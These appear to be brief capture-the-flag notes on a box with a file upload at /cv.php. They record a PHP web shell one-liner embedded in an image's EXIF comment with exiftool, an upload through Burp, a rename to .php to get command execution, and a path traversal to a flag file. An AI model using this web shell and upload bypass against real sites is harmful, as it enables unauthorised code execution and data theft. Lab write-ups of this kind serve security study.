# Bypass Disable Functions

this box has a site with a file upload, on the /cv.php


small.jpg
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' test.jpeg

upload with burp as test.jpg

repeat but change name too .php
mv small.jpg small.php

uploaded it and can run simple php 
so trying some php stuff

see /lists/php_shells.md

iterating these folders we found the path `/../../../../../../../../home/user/flag.txt`
